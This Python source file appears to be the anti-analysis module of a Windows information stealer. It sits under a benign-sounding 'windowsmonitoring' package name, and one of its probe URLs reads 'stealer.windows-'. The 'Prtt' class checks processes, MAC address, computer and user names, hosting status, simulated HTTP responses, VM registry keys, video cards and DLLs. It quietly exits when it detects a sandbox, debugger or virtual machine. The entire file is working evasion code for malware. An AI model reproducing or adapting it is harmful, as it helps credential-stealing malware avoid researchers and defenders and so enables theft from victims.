from re import findall
from typing import List
from uuid import getnode
from random import choices
from getpass import getuser
from os import path, getenv
from urllib.request import urlopen
from string import ascii_uppercase, ascii_lowercase, digits
from winreg import OpenKey, QueryInfoKey, QueryValueEx, EnumKey, HKEY_LOCAL_MACHINE, KEY_READ

from systoring.windowsmonitoring.enums import Prtts
from systoring.windowsmonitoring.modules import System, Processes
from systoring.windowsmonitoring.helpers.config import PrttConfig


class Prtt:
    """
    Protects the script from virtual machines and debugging.
    """
    def __init__(self, protectors: List[Prtts] = None):

        if protectors is None:
            self.__Prtts = [Prtts.disable]
        else:
            self.__Prtts = protectors

        self.__config = PrttConfig()

    @staticmethod
    def __generate_random_string(length: int = 10) -> str:
        """
        Creates a random string.

        Parameters:
        - length [int]: string length.

        Returns:
        - str: Random string.
        """
        return ''.join(choices(ascii_uppercase + ascii_lowercase + digits, k=length))

    def __check_processes(self) -> bool:
        """
        Checks processes of the computer.

        Parameters:
        - None.

        Returns:
        - bool: True or False.
        """
        for process in Processes.get_processes_list():

            if process[0] not in self.__config.Tasks:
                continue

            return True

        return False

    def __check_mac_address(self) -> bool:
        """
        Checks the MAC address of the computer.

        Parameters:
        - None.

        Returns:
        - bool: True or False.
        """
        return ':'.join(findall("..", "%012x" % getnode())).lower() in self.__config.MacAddresses

    def __check_computer(self) -> bool:
        """
        Checks the name of the computer.

        Parameters:
        - None.

        Returns:
        - bool: True or False.
        """
        return getenv("computername").lower() in self.__config.Computers

    def __check_user(self) -> bool:
        """
        Checks the user of the computer.

        Parameters:
        - None.

        Returns:
        - bool: True or False.
        """
        return getuser().lower() in self.__config.Users

    def __check_hosting(self) -> bool:
        """
        Checks if the computer is a server.

        Parameters:
        - None.

        Returns:
        - bool: True or False.
        """
        try:
            return urlopen(url=self.__config.IPUrl, timeout=3).read().decode("utf-8").lower().strip() == "true"
        except:
            return False

    def __check_http_simulation(self) -> bool:
        """
        Checks if the user is simulating a fake HTTPS connection.

        Parameters:
        - None.

        Returns:
        - bool: True or False.
        """
        try:
            urlopen(url=f"https://stealer.windows-{self.__generate_random_string(20)}", timeout=1)
        except:
            return False
        else:
            return True

    def __check_virtual_machine(self) -> bool:
        """
        Checks whether virtual machine files exist on the computer.

        Parameters:
        - None.

        Returns:
        - bool: True or False.
        """
        try:

            with OpenKey(HKEY_LOCAL_MACHINE, r"SYSTEM\CurrentControlSet\Services\Disk\Enum", 0, KEY_READ) as reg_key:
                value = QueryValueEx(reg_key, '0')[0]

                if any(item.lower() in value.lower() for item in self.__config.RegistryEnums):
                    return True

        except:
            pass

        reg_keys = [
            r"SYSTEM\CurrentControlSet\Enum\IDE",
            r"System\CurrentControlSet\Enum\SCSI"
        ]

        for key in reg_keys:
            try:

                with OpenKey(HKEY_LOCAL_MACHINE, key, 0, KEY_READ) as reg_key:
                    count = QueryInfoKey(reg_key)[0]

                    for item in range(count):

                        if not any(value.lower() in EnumKey(reg_key, item).lower() for value in self.__config.RegistryEnums):
                            continue

                        return True

            except:
                pass

        if any(item.lower() in System.get_video_card() for item in self.__config.Cards):
            return True

        if any(path.exists(item) for item in self.__config.Dlls):
            return True

        return False

    def run(self) -> None:
        """
        Launches the Prtt module.

        Parameters:
        - None.

        Returns:
        - None.
        """
        if not self.__Prtts or Prtts.disable in self.__Prtts:
            return

        try:

            checks = [
                {
                    "method": self.__check_processes,
                    "status": any(item in self.__Prtts for item in [Prtts.processes, Prtts.all])
                },
                {
                    "method": self.__check_mac_address,
                    "status": any(item in self.__Prtts for item in [Prtts.mac_address, Prtts.all])
                },
                {
                    "method": self.__check_computer,
                    "status": any(item in self.__Prtts for item in [Prtts.computer, Prtts.all])
                },
                {
                    "method": self.__check_user,
                    "status": any(item in self.__Prtts for item in [Prtts.user, Prtts.all])
                },
                {
                    "method": self.__check_hosting,
                    "status": any(item in self.__Prtts for item in [Prtts.hosting, Prtts.all])
                },
                {
                    "method": self.__check_http_simulation,
                    "status": any(item in self.__Prtts for item in [Prtts.http_simulation, Prtts.all])
                },
                {
                    "method": self.__check_virtual_machine,
                    "status": any(item in self.__Prtts for item in [Prtts.virtual_machine, Prtts.all])
                }
            ]

            for check in checks:

                if check["status"] is False:
                    continue

                result = check["method"]()

                if result:
                    exit(0)

        except Exception as e:
            pass
